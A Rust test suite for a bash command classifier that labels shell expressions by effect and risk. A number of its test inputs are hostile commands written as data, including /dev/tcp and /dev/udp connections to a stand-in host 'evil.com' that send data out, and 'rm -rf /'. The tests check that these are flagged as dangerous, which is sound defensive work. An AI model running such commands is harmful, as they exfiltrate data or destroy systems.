use std::sync::OnceLock;
use std::{
    fs,
    time::{SystemTime, UNIX_EPOCH},
};

use bash_classify::classifier::is_system_path;
use bash_classify::database::load_database;
use bash_classify::models::Classification::*;
use bash_classify::models::Risk::*;
use bash_classify::{classify_expression, CommandDatabase};

fn db() -> &'static CommandDatabase {
    static DB: OnceLock<CommandDatabase> = OnceLock::new();
    DB.get_or_init(|| load_database(None).unwrap())
}

fn tmpdir(name: &str) -> std::path::PathBuf {
    let nonce = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let path = std::env::temp_dir().join(format!("rust-bash-classify-{name}-{nonce}"));
    fs::create_dir_all(&path).unwrap();
    path
}

macro_rules! class_case {
    ($name:ident, $expr:expr, $class:ident) => {
        #[test]
        fn $name() {
            assert_eq!(
                classify_expression($expr, Some(db()))
                    .unwrap()
                    .classification,
                $class
            );
        }
    };
}
macro_rules! not_class_case {
    ($name:ident, $expr:expr, $class:ident) => {
        #[test]
        fn $name() {
            assert_ne!(
                classify_expression($expr, Some(db()))
                    .unwrap()
                    .classification,
                $class
            );
        }
    };
}
macro_rules! risk_case {
    ($name:ident, $expr:expr, $class:ident, $risk:ident) => {
        #[test]
        fn $name() {
            let r = classify_expression($expr, Some(db())).unwrap();
            assert_eq!(r.classification, $class);
            assert_eq!(r.risk, $risk);
        }
    };
}

#[test]
fn test_kubectl_pipeline() {
    let result = classify_expression(
        "kubectl --context=prod get pods -n kube-system | grep Running",
        Some(db()),
    )
    .unwrap();
    assert_eq!(result.classification, Readonly);
    assert_eq!(result.commands.len(), 2);
    assert_eq!(
        result.commands[0].matched_rule.as_deref(),
        Some("kubectl.get")
    );
    assert_eq!(result.commands[0].classification, Readonly);
    assert!(result.commands[0]
        .ignored_options
        .as_ref()
        .unwrap()
        .contains(&"--context=prod".to_string()));
    assert_eq!(result.commands[1].matched_rule.as_deref(), Some("grep"));
}

#[test]
fn test_find_xargs_rm() {
    let r =
        classify_expression("find /tmp -name \"*.log\" | xargs -I {} rm {}", Some(db())).unwrap();
    assert_eq!(r.commands.len(), 2);
    assert_eq!(r.commands[0].matched_rule.as_deref(), Some("find"));
    assert_eq!(r.commands[0].classification, Readonly);
    assert!(r.directories.contains(&"/tmp".to_string()));
    assert_eq!(r.commands[1].matched_rule.as_deref(), Some("xargs"));
    assert_eq!(
        r.commands[1].inner_commands[0].delegation_mode,
        "rest_are_argv"
    );
}

#[test]
fn test_find_exec_rm() {
    let r = classify_expression("find . -name \"*.tmp\" -exec rm -f {} \\;", Some(db())).unwrap();
    assert_eq!(r.classification, Dangerous);
    assert_eq!(r.commands[0].matched_rule.as_deref(), Some("find"));
    assert_eq!(
        r.commands[0].inner_commands[0].delegation_mode,
        "terminated_argv"
    );
    assert_eq!(
        r.commands[0].inner_commands[0].command,
        vec!["rm".to_string()]
    );
}

#[test]
fn test_find_exec_grep_is_readonly() {
    let r = classify_expression(
        "find . -name \"*.java\" -exec grep -l \"pattern\" {} \\;",
        Some(db()),
    )
    .unwrap();
    assert_eq!(r.classification, Readonly);
    assert_eq!(r.commands[0].inner_commands[0].classification, Readonly);
}

#[test]
fn test_kubectl_exec_cat() {
    let r = classify_expression("kubectl exec -it my-pod -- cat /etc/config", Some(db())).unwrap();
    assert_eq!(r.classification, Dangerous);
    assert_eq!(r.commands[0].matched_rule.as_deref(), Some("kubectl.exec"));
    assert_eq!(
        r.commands[0].inner_commands[0].delegation_mode,
        "after_separator"
    );
    assert_eq!(
        r.commands[0].inner_commands[0].command,
        vec!["cat".to_string()]
    );
    assert_eq!(
        r.commands[0].inner_commands[0].classification,
        ExternalEffects
    );
}

#[test]
fn test_sh_c_expression() {
    let r = classify_expression("sh -c \"ls /tmp | grep log\"", Some(db())).unwrap();
    assert_eq!(r.classification, Readonly);
    assert_eq!(r.commands[0].matched_rule.as_deref(), Some("sh"));
    assert!(r.commands[0].inner_commands.len() >= 2);
    for ic in &r.commands[0].inner_commands {
        assert_eq!(ic.classification, Readonly);
    }
}

class_case!(test_pipe_both_readonly, "ls | grep pattern", Readonly);
class_case!(test_pipe_readonly_and_dangerous, "ls | rm file", Dangerous);
class_case!(
    test_unknown_trumps_readonly,
    "echo hello && unknown_command",
    Unknown
);
class_case!(
    test_semicolons_both_readonly,
    "cat file; echo done",
    Readonly
);
class_case!(
    test_output_redirect_elevates_to_write,
    "echo hello > output.txt",
    LocalEffects
);
class_case!(
    test_devnull_redirect_no_elevation_a,
    "echo hello > /dev/null",
    Readonly
);
class_case!(
    test_append_redirect_elevates_to_write,
    "echo hello >> file.log",
    LocalEffects
);
class_case!(
    test_input_redirect_no_elevation_a,
    "cat < input.txt",
    Readonly
);

#[test]
fn test_stderr_devnull_no_elevation() {
    let r = classify_expression("cmd 2>/dev/null", Some(db())).unwrap();
    assert_eq!(r.classification, Unknown);
    assert!(r
        .redirects
        .iter()
        .any(|x| x.target == "/dev/null" && !x.affects_classification));
}

#[test]
fn test_cd_directory() {
    assert!(classify_expression("cd /tmp && ls", Some(db()))
        .unwrap()
        .directories
        .contains(&"/tmp".to_string()));
}
#[test]
fn test_find_directory() {
    assert!(
        classify_expression("find /var/log -name \"*.log\"", Some(db()))
            .unwrap()
            .directories
            .contains(&"/var/log".to_string())
    );
}
#[test]
fn test_git_c_directory() {
    assert!(classify_expression("git -C /some/repo status", Some(db()))
        .unwrap()
        .directories
        .contains(&"/some/repo".to_string()));
}
#[test]
fn test_cat_extracts_dirname() {
    assert!(classify_expression("cat /etc/config", Some(db()))
        .unwrap()
        .directories
        .contains(&"/etc".to_string()));
}
#[test]
fn test_cat_no_slash_no_directory() {
    assert_eq!(
        classify_expression("cat file.txt", Some(db()))
            .unwrap()
            .directories,
        Vec::<String>::new()
    );
}
#[test]
fn test_cat_nested_path() {
    assert!(classify_expression("cat /var/log/syslog", Some(db()))
        .unwrap()
        .directories
        .contains(&"/var/log".to_string()));
}
class_case!(
    test_background_elevates_to_write,
    "echo hello &",
    LocalEffects
);

#[test]
fn test_empty_string() {
    let r = classify_expression("", Some(db())).unwrap();
    assert_eq!(r.classification, Readonly);
    assert!(r.commands.is_empty());
}
#[test]
fn test_comment_only() {
    let r = classify_expression("# just a comment", Some(db())).unwrap();
    assert_eq!(r.classification, Readonly);
    assert!(r.commands.is_empty());
}
#[test]
fn test_complex_nested_delegation_chain() {
    let r = classify_expression(
        "FOO=bar sudo env PATH=/usr/bin sh -c \"kubectl --context=prod get pods | grep Running\"",
        Some(db()),
    )
    .unwrap();
    assert_eq!(r.classification, Dangerous);
    assert!(!r.commands.is_empty());
}
#[test]
fn test_variable_command() {
    let r = classify_expression("$CMD arg1 arg2", Some(db())).unwrap();
    assert_eq!(r.classification, Dangerous);
    assert_eq!(
        r.commands[0].classification_reason.as_deref(),
        Some("variable expansion in command position")
    );
}
#[test]
fn test_classify_without_database_arg() {
    let r = classify_expression("ls /tmp", None).unwrap();
    assert_eq!(r.classification, Readonly);
    assert!(!r.commands.is_empty());
}
#[test]
fn test_ls_directory() {
    assert!(classify_expression("ls /tmp", Some(db()))
        .unwrap()
        .directories
        .contains(&"/tmp".to_string()));
}
#[test]
fn test_head_directory() {
    assert!(classify_expression("head /var/log/syslog", Some(db()))
        .unwrap()
        .directories
        .contains(&"/var/log".to_string()));
}
class_case!(
    test_background_elevates_readonly_to_write,
    "echo hello &",
    LocalEffects
);
class_case!(test_input_redirect_no_elevation, "cat < file.txt", Readonly);
class_case!(
    test_devnull_redirect_no_elevation,
    "echo hello > /dev/null",
    Readonly
);
class_case!(test_heredoc_no_elevation, "cat <<EOF\nhello\nEOF", Readonly);
class_case!(test_herestring_no_elevation, "cat <<< hello", Readonly);
class_case!(
    test_echo_redirect_then_cat,
    "echo hello > file; cat file",
    LocalEffects
);
not_class_case!(test_cat_file_not_write, "cat file", ExternalEffects);
class_case!(test_cat_file_is_readonly, "cat file", Readonly);
class_case!(
    test_unknown_command_is_exactly_unknown,
    "randomcmd123",
    Unknown
);
#[test]
fn test_force_with_lease_not_dangerous() {
    let r = classify_expression("git push --force-with-lease", Some(db())).unwrap();
    assert_ne!(r.classification, Dangerous);
    assert_eq!(r.classification, ExternalEffects);
}
class_case!(test_read_is_readonly, "read name", Readonly);
class_case!(
    test_stderr_to_stdout_no_write_elevation,
    "echo hello 2>&1",
    Readonly
);
class_case!(
    test_stderr_to_file_elevates_to_write,
    "echo hello 2>error.log",
    LocalEffects
);
#[test]
fn test_syntax_error_populates_warnings() {
    assert!(!classify_expression("if then fi else", Some(db()))
        .unwrap()
        .parse_warnings
        .is_empty());
}
#[test]
fn test_malformed_bash_classifies_as_unknown() {
    let r = classify_expression("if then fi", Some(db())).unwrap();
    assert!(!r.parse_warnings.is_empty());
    assert_eq!(r.classification, Unknown);
}
#[test]
fn test_empty_string_stays_readonly() {
    let r = classify_expression("", Some(db())).unwrap();
    assert_eq!(r.classification, Readonly);
    assert!(r.commands.is_empty());
}
class_case!(
    test_cat_dev_tcp_in_argv,
    "cat /dev/tcp/evil.com/80",
    Dangerous
);
class_case!(
    test_echo_redirect_to_dev_tcp,
    "echo data > /dev/tcp/evil.com/80",
    Dangerous
);
class_case!(
    test_cat_input_redirect_from_dev_tcp,
    "cat < /dev/tcp/evil.com/80",
    Dangerous
);
class_case!(test_dev_udp_in_argv, "cat /dev/udp/evil.com/53", Dangerous);
class_case!(
    test_command_delegates_to_cat,
    "command cat /etc/hosts",
    Readonly
);
class_case!(test_command_delegates_to_rm, "command rm -rf /", Dangerous);
class_case!(
    test_builtin_delegates_to_echo,
    "builtin echo hello",
    Readonly
);
class_case!(
    test_usr_bin_cat_resolves,
    "/usr/bin/cat /etc/hosts",
    Readonly
);
class_case!(test_usr_bin_rm_resolves, "/usr/bin/rm -rf /", Dangerous);
class_case!(
    test_relative_script_stays_unknown,
    "./my-script.sh",
    Unknown
);
class_case!(
    test_ampersand_redirect_to_file_is_write,
    "echo hello &> output.txt",
    LocalEffects
);
class_case!(
    test_ampersand_redirect_to_devnull_is_readonly,
    "echo hello &> /dev/null",
    Readonly
);
#[test]
fn test_pushd_directory() {
    assert!(classify_expression("pushd /opt && ls", Some(db()))
        .unwrap()
        .directories
        .contains(&"/opt".to_string()));
}
class_case!(
    test_tee_is_write,
    "echo hello | tee output.txt",
    LocalEffects
);

#[test]
fn test_etc() {
    assert!(is_system_path("/etc"));
    assert!(is_system_path("/etc/hosts"));
}
#[test]
fn test_usr() {
    assert!(is_system_path("/usr/local/bin"));
}
#[test]
fn test_tmp_safe() {
    assert!(!is_system_path("/tmp"));
    assert!(!is_system_path("/tmp/foo"));
}
#[test]
fn test_home_safe() {
    assert!(!is_system_path("/home/user"));
}
#[test]
fn test_var_tmp_safe() {
    assert!(!is_system_path("/var/tmp"));
    assert!(!is_system_path("/var/tmp/test"));
}
#[test]
fn test_var_log_system() {
    assert!(is_system_path("/var/log"));
}
#[test]
fn test_dev_null_safe() {
    assert!(!is_system_path("/dev/null"));
}
#[test]
fn test_dev_sda_system() {
    assert!(is_system_path("/dev/sda"));
}
#[test]
fn test_relative_path() {
    assert!(!is_system_path("etc/hosts"));
    assert!(!is_system_path("./usr/bin"));
}
#[test]
fn test_boot() {
    assert!(is_system_path("/boot/vmlinuz"));
}
#[test]
fn test_proc() {
    assert!(is_system_path("/proc/1/status"));
}
class_case!(
    test_write_to_etc_is_dangerous,
    "cp config.txt /etc/myapp/config",
    Dangerous
);
class_case!(
    test_write_to_usr_is_dangerous,
    "cp binary /usr/local/bin/mybinary",
    Dangerous
);
class_case!(test_read_from_etc_is_readonly, "cat /etc/hosts", Readonly);
class_case!(
    test_read_from_usr_is_readonly,
    "ls /usr/local/bin",
    Readonly
);
class_case!(
    test_write_to_tmp_not_elevated,
    "cp file /tmp/backup",
    LocalEffects
);
class_case!(
    test_write_to_home_not_elevated,
    "cp file /home/user/backup",
    LocalEffects
);
class_case!(
    test_write_to_var_tmp_not_elevated,
    "cp file /var/tmp/backup",
    LocalEffects
);
class_case!(
    test_write_to_var_log_is_dangerous,
    "cp file /var/log/myapp.log",
    Dangerous
);
class_case!(
    test_redirect_to_etc_is_dangerous,
    "echo config > /etc/myapp.conf",
    Dangerous
);
class_case!(
    test_redirect_to_tmp_not_elevated,
    "echo hello > /tmp/test.txt",
    LocalEffects
);
class_case!(
    test_mkdir_in_etc_is_dangerous,
    "mkdir /etc/myapp",
    Dangerous
);
class_case!(
    test_touch_in_opt_is_dangerous,
    "touch /opt/myapp/config",
    Dangerous
);
class_case!(
    test_chmod_in_usr_is_dangerous,
    "chmod 755 /usr/local/bin/script.sh",
    Dangerous
);
class_case!(test_rm_is_already_dangerous, "rm /etc/config", Dangerous);
class_case!(test_dev_null_safe_class, "echo hello > /dev/null", Readonly);
class_case!(
    test_relative_path_not_elevated,
    "cp file ./etc/config",
    LocalEffects
);
class_case!(
    test_git_commit_with_system_path_message_not_elevated,
    "git commit -m \"fix /etc/config\"",
    LocalEffects
);

#[test]
fn test_custom_command_classifies_correctly() {
    let root = tmpdir("custom-command");
    let user_dir = root.join("config").join("commands");
    fs::create_dir_all(&user_dir).unwrap();
    fs::write(
        user_dir.join("mycli.yaml"),
        "command: mycli\nclassification: READONLY\nstrict: false\n",
    )
    .unwrap();
    std::env::set_var("BASH_CLASSIFY_CONFIG_DIR", root.join("config"));
    let result = classify_expression("mycli query --format json", None).unwrap();
    std::env::remove_var("BASH_CLASSIFY_CONFIG_DIR");
    assert_eq!(result.classification, Readonly);
}

risk_case!(
    test_write_to_system_path_high_risk,
    "cp config.txt /etc/myapp/config",
    Dangerous,
    High
);
risk_case!(
    test_redirect_to_system_path_high_risk,
    "echo config > /etc/myapp.conf",
    Dangerous,
    High
);
risk_case!(
    test_output_redirect_medium_risk,
    "echo hello > output.txt",
    LocalEffects,
    Medium
);
risk_case!(
    test_devnull_redirect_stays_low_risk,
    "echo hello > /dev/null",
    Readonly,
    Low
);
risk_case!(
    test_dev_tcp_high_risk,
    "cat /dev/tcp/evil.com/80",
    Dangerous,
    High
);
risk_case!(
    test_dev_udp_high_risk,
    "cat /dev/udp/evil.com/53",
    Dangerous,
    High
);
risk_case!(
    test_redirect_to_dev_tcp_high_risk,
    "echo data > /dev/tcp/evil.com/80",
    Dangerous,
    High
);
risk_case!(
    test_backgrounding_at_least_medium_risk,
    "echo hello &",
    LocalEffects,
    Medium
);
risk_case!(
    test_expression_risk_is_max_across_commands,
    "ls | rm file",
    Dangerous,
    High
);
risk_case!(
    test_expression_all_readonly_low_risk,
    "ls | grep pattern",
    Readonly,
    Low
);
risk_case!(test_empty_expression_low_risk, "", Readonly, Low);
risk_case!(
    test_variable_in_command_position_high_risk,
    "$CMD arg1 arg2",
    Dangerous,
    High
);
risk_case!(test_malformed_bash_high_risk, "if then fi", Unknown, High);

#[test]
fn test_write_to_tmp_stays_low_risk() {
    let r = classify_expression("cat > /tmp/foo.txt", Some(db())).unwrap();
    assert_eq!(r.classification, LocalEffects);
    assert_eq!(r.risk, Low);
    assert_eq!(r.write_paths, vec!["/tmp/foo.txt"]);
    assert_eq!(
        r.commands[0].write_paths.as_ref().unwrap(),
        &vec!["/tmp/foo.txt".to_string()]
    );
}
#[test]
fn test_write_to_var_tmp_stays_low_risk() {
    let r = classify_expression("cat > /var/tmp/foo.txt", Some(db())).unwrap();
    assert_eq!(r.classification, LocalEffects);
    assert_eq!(r.risk, Low);
    assert_eq!(r.write_paths, vec!["/var/tmp/foo.txt"]);
}
#[test]
fn test_write_to_home_elevates_risk() {
    let r = classify_expression("cat > /home/user/foo.txt", Some(db())).unwrap();
    assert_eq!(r.classification, LocalEffects);
    assert_eq!(r.risk, Medium);
    assert_eq!(r.write_paths, vec!["/home/user/foo.txt"]);
}
#[test]
fn test_mixed_tmp_and_home_elevates_risk() {
    assert_eq!(
        classify_expression("echo hello > /tmp/a.txt > /home/user/b.txt", Some(db()))
            .unwrap()
            .risk,
        Medium
    );
}
#[test]
fn test_read_redirect_detected() {
    let r = classify_expression("cat < /home/user/data.txt", Some(db())).unwrap();
    assert_eq!(r.classification, Readonly);
    assert_eq!(r.risk, Low);
    assert_eq!(r.read_paths, vec!["/home/user/data.txt"]);
    assert!(r.write_paths.is_empty());
}
#[test]
fn test_read_and_write_redirect() {
    let r = classify_expression("sort < /home/user/hosts > /tmp/sorted.txt", Some(db())).unwrap();
    assert_eq!(r.classification, LocalEffects);
    assert_eq!(r.risk, Low);
    assert_eq!(r.write_paths, vec!["/tmp/sorted.txt"]);
    assert_eq!(r.read_paths, vec!["/home/user/hosts"]);
}
#[test]
fn test_dev_null_excluded_from_write_paths() {
    assert!(classify_expression("cat > /dev/null", Some(db()))
        .unwrap()
        .write_paths
        .is_empty());
}
#[test]
fn test_heredoc_not_in_read_paths() {
    assert!(classify_expression("cat << EOF\nhello\nEOF", Some(db()))
        .unwrap()
        .read_paths
        .is_empty());
}
#[test]
fn test_expression_level_aggregation() {
    let r = classify_expression(
        "cat < /home/user/data.txt | tee /tmp/out.txt > /tmp/log.txt",
        Some(db()),
    )
    .unwrap();
    assert!(r.read_paths.contains(&"/home/user/data.txt".to_string()));
    assert!(r.write_paths.contains(&"/tmp/log.txt".to_string()));
}

fn make_alias_db(name: &str) -> CommandDatabase {
    let dir = tmpdir(name);
    fs::write(dir.join("target.yaml"), "command: target\nclassification: READONLY\nstrict: false\nsubcommands:\n  sub1: {classification: READONLY}\n  sub2: {classification: DANGEROUS}\n").unwrap();
    fs::write(
        dir.join("myalias.yaml"),
        "command: myalias\ndescription: pointer\nalias_of: target\n",
    )
    .unwrap();
    load_database(Some(&dir)).unwrap()
}

#[test]
fn test_alias_resolves_to_target() {
    let db = make_alias_db("alias1");
    let r = classify_expression("myalias sub1", Some(&db)).unwrap();
    let t = classify_expression("target sub1", Some(&db)).unwrap();
    assert_eq!(r.classification, t.classification);
    assert_eq!(r.risk, t.risk);
    assert_eq!(r.commands[0].command[0], "myalias");
    assert_eq!(r.commands[0].matched_rule.as_deref(), Some("myalias.sub1"));
}
#[test]
fn test_alias_resolves_dangerous_subcommand() {
    let db = make_alias_db("alias2");
    let r = classify_expression("myalias sub2", Some(&db)).unwrap();
    assert_eq!(r.classification, Dangerous);
    assert_eq!(r.commands[0].matched_rule.as_deref(), Some("myalias.sub2"));
}
#[test]
fn test_dangling_alias_raises() {
    let dir = tmpdir("dangling-alias");
    fs::write(
        dir.join("myalias.yaml"),
        "command: myalias\nalias_of: nonexistent\n",
    )
    .unwrap();
    let db = load_database(Some(&dir)).unwrap();
    assert!(classify_expression("myalias foo", Some(&db))
        .unwrap_err()
        .to_string()
        .contains("nonexistent"));
}
#[test]
fn test_alias_chain_too_deep_raises() {
    let dir = tmpdir("alias-chain");
    fs::write(
        dir.join("target.yaml"),
        "command: target\nclassification: READONLY\n",
    )
    .unwrap();
    fs::write(dir.join("mid.yaml"), "command: mid\nalias_of: target\n").unwrap();
    fs::write(
        dir.join("myalias.yaml"),
        "command: myalias\nalias_of: mid\n",
    )
    .unwrap();
    let db = load_database(Some(&dir)).unwrap();
    assert!(classify_expression("myalias foo", Some(&db))
        .unwrap_err()
        .to_string()
        .contains("alias chain too deep"));
}
